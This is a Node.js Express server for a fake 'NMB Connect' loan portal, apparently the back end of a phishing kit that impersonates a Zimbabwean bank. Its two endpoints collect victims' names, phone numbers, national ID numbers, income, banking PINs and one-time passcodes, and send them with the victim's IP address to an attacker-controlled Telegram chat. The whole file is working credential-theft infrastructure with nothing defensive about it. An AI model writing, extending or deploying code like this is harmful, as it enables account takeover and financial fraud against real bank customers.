'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: false }));

/* ── SECURITY HEADERS ── */
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options',  'nosniff');
  res.setHeader('X-Frame-Options',         'DENY');
  res.setHeader('X-XSS-Protection',        '1; mode=block');
  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
  next();
});

/* ── RATE LIMITERS ── */
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 30,
  message: { error: 'Too many requests. Please try again later.' },
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
});
app.use('/api/telegram', apiLimiter);
app.use('/api/loan',     apiLimiter);

/* ── STATIC FILES ── */
app.use(express.static(path.join(__dirname), {
  extensions: ['html'],
  index: 'index.html',
}));

/* ── TELEGRAM HELPER ── */
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
      return resolve({ ok: false, reason: 'env_missing' });
    }
    const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type':  'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch (e) { resolve({ ok: false }); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

/* ── POST /api/loan  — NMB loan application notification ── */
app.post('/api/loan', async (req, res) => {
  try {
    const {
      event        = 'loan_submitted',
      name         = '',
      phone        = '',
      phoneDisplay = '',
      nid          = '',
      emp          = '',
      income       = '',
      amount       = '',
      tenure       = '',
      monthly      = '',
      rate         = '',
      pin          = '',
      otp          = '',
      submittedAt  = '',
    } = req.body || {};

    if (!phone && !name) return res.status(400).json({ error: 'Invalid payload' });

    const now = new Date().toLocaleString('en-GB', {
      timeZone: 'Africa/Harare', hour12: false,
    });

    const emoji = {
      loan_submitted:       '🏦',
      loan_pin_auth:        '🔐',
      loan_otp_confirmed:   '✅',
      loan_otp_resend:      '🔁',
    }[event] || '📋';

    const empLabel = emp === 'employed' ? 'Employed (Salaried)' : emp === 'self' ? 'Self-Employed' : emp || '—';

    /* Reconstruct full phone number cleanly */
    const localNum = phone.replace(/^\+?0*263/, '').replace(/\D/g, '');
    const fullPhone = localNum ? `+263${localNum}` : (phoneDisplay || phone || '—');

    const lines = [
      `${emoji} <b>NMB Connect — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${submittedAt ? new Date(submittedAt).toLocaleString('en-GB',{timeZone:'Africa/Harare',hour12:false})+' CAT' : now+' CAT'}`,
      ``,
      `👤 <b>Name:</b> ${name || '—'}`,
      `📱 <b>Phone:</b> <code>${fullPhone}</code>`,
      pin          ? `🔐 <b>PIN:</b> <code>${pin}</code>`             : null,
      otp          ? `🔑 <b>OTP:</b> <code>${otp}</code>`            : null,
      ``,
      nid          ? `🪪 <b>National ID:</b> <code>${nid}</code>`     : null,
      emp          ? `💼 <b>Employment:</b> ${empLabel}`              : null,
      income       ? `💰 <b>Income:</b> USD ${Number(income).toLocaleString()}/month` : null,
      req.body.hasAcct !== undefined ? `🏦 <b>NMB Account:</b> ${req.body.hasAcct ? '✅ Confirmed' : '❌ No account'}` : null,
      ``,
      amount       ? `💵 <b>Loan Amount:</b> USD ${Number(amount).toLocaleString()}` : null,
      tenure       ? `📅 <b>Tenure:</b> ${tenure} months`            : null,
      monthly      ? `📆 <b>Monthly Repay:</b> USD ${Number(monthly).toFixed(2)}` : null,
      rate         ? `📈 <b>Rate:</b> ${rate}% p.m. flat`            : null,
      ``,
      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
    ].filter(Boolean).join('\n');

    const result = await sendTelegramMessage(lines);
    return res.json({ ok: true, telegram: result.ok });
  } catch (err) {
    console.error('[/api/loan]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── POST /api/telegram — legacy / PIN+OTP auth during loan flow ── */
app.post('/api/telegram', async (req, res) => {
  try {
    const {
      event = '', phone = '', pin = '', otp = '',
      // NMB loan fields passed through login page
      name = '', nid = '', emp = '', income = '', amount = '', tenure = '',
      monthly = '', submittedAt = '',
    } = req.body || {};

    /* Route to loan handler if it's a loan event */
    if (['loan_submitted','loan_pin_auth','loan_otp_confirmed','loan_otp_resend'].includes(event)) {
      return res.redirect(307, '/api/loan');
    }

    const local = phone
      .replace(/^\+?00263/, '').replace(/^\+?263/, '').replace(/^0/, '')
      .replace(/\D/g, '').trim();

    const emoji = {
      receive_offer_clicked: '📲',
      offer_received:        '✅',
      resend_otp:            '🔁',
    }[event] || '📋';

    const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare', hour12: false });

    const message = [
      `${emoji} <b>NMB Connect — ${event.replace(/_/g,' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${now} CAT`,
      `📱 <b>Phone:</b> <code>+263${local}</code>`,
      pin ? `🔐 <b>PIN:</b> <code>${pin}</code>` : null,
      otp ? `🔑 <b>OTP:</b> <code>${otp}</code>` : null,
      amount ? `\n💵 <b>Amount:</b> USD ${amount}` : null,
      tenure ? `📅 <b>Tenure:</b> ${tenure} months` : null,
      name   ? `👤 <b>Applicant:</b> ${name}`       : null,
      ``,
      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
    ].filter(Boolean).join('\n');

    const result = await sendTelegramMessage(message);
    return res.json({ ok: true, telegram: result.ok });
  } catch (err) {
    console.error('[/api/telegram]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── GET /health ── */
app.get('/health', (req, res) => {
  res.json({
    status:   'ok',
    app:      'NMB Connect Loan Portal',
    uptime:   process.uptime(),
    telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID),
  });
});

/* ── CATCH-ALL → index.html ── */
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

/* ── START ── */
app.listen(PORT, () => {
  console.log(`✅  NMB Connect server running on port ${PORT}`);
  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
});
